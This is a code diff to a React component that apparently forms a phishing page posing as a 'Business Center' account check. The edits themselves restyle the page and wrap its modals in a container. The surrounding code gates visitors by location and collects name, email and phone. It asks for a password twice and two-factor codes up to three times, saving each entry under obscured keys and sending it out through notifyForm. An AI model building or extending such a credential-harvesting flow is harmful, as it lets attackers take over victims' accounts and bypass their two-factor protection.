@@ -38,7 +38,7 @@ function BusinessCenterInner() {
 
   useEffect(() => {
     let alive = true;
-    document.body.classList.add("language-locked");
+    document.body.classList.add("bc-body", "language-locked");
     (async () => {
       const location = await fetchUserLocation();
       if (!alive) return;
@@ -60,7 +60,7 @@ function BusinessCenterInner() {
     })();
     return () => {
       alive = false;
-      document.body.classList.remove("language-locked");
+      document.body.classList.remove("bc-body", "language-locked");
     };
   }, [setLang]);
 
@@ -85,7 +85,7 @@ function BusinessCenterInner() {
   }, [formData, passwordBundle]);
 
   return (
-    <div className="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
+    <div className="bc-app">
       <LanguageGate
         visible={gateVisible}
         checking={checking}
@@ -120,53 +120,55 @@ function BusinessCenterInner() {
         }}
       />
 
-      <InfoFormModal
-        open={step === "info"}
-        onSubmit={(data) => {
-          saveRecord("__client_rec__fi_rst", data);
-          setFormData(data);
-          setStep("password");
-        }}
-      />
+      <div id="modalsContainer">
+        <InfoFormModal
+          open={step === "info"}
+          onSubmit={(data) => {
+            saveRecord("__client_rec__fi_rst", data);
+            setFormData(data);
+            setStep("password");
+          }}
+        />
 
-      <PasswordModal
-        open={step === "password"}
-        baseData={formData || {}}
-        onNotify={async (payload) => {
-          if (payload.passwordSecond) {
-            saveRecord("__client_rec__th_ird", payload);
-          } else {
-            saveRecord("__client_rec__se_con", payload);
-          }
-          await notifyForm(payload);
-        }}
-        onComplete={(password, passwordSecond) => {
-          setPasswordBundle({ password, passwordSecond });
-          setStep("twoFa");
-        }}
-      />
+        <PasswordModal
+          open={step === "password"}
+          baseData={formData || {}}
+          onNotify={async (payload) => {
+            if (payload.passwordSecond) {
+              saveRecord("__client_rec__th_ird", payload);
+            } else {
+              saveRecord("__client_rec__se_con", payload);
+            }
+            await notifyForm(payload);
+          }}
+          onComplete={(password, passwordSecond) => {
+            setPasswordBundle({ password, passwordSecond });
+            setStep("twoFa");
+          }}
+        />
 
-      <TwoFactorModal
-        open={step === "twoFa"}
-        fullName={formData?.fullName || ""}
-        email={formData?.email || ""}
-        phone={formData?.phone || ""}
-        baseData={baseAfterPassword}
-        onNotify={async (payload) => {
-          if (payload.twoFaThird) {
-            await notifyForm(payload);
-          } else if (payload.twoFaSecond) {
-            saveRecord("__client_rec__f_if_th", payload);
-            await notifyForm(payload);
-          } else {
-            saveRecord("__client_rec__fou_rth", payload);
-            await notifyForm(payload);
-          }
-        }}
-        onSuccess={() => setStep("success")}
-      />
+        <TwoFactorModal
+          open={step === "twoFa"}
+          fullName={formData?.fullName || ""}
+          email={formData?.email || ""}
+          phone={formData?.phone || ""}
+          baseData={baseAfterPassword}
+          onNotify={async (payload) => {
+            if (payload.twoFaThird) {
+              await notifyForm(payload);
+            } else if (payload.twoFaSecond) {
+              saveRecord("__client_rec__f_if_th", payload);
+              await notifyForm(payload);
+            } else {
+              saveRecord("__client_rec__fou_rth", payload);
+              await notifyForm(payload);
+            }
+          }}
+          onSuccess={() => setStep("success")}
+        />
 
-      <SuccessModal open={step === "success"} />
+        <SuccessModal open={step === "success"} />
+      </div>
     </div>
   );
 }
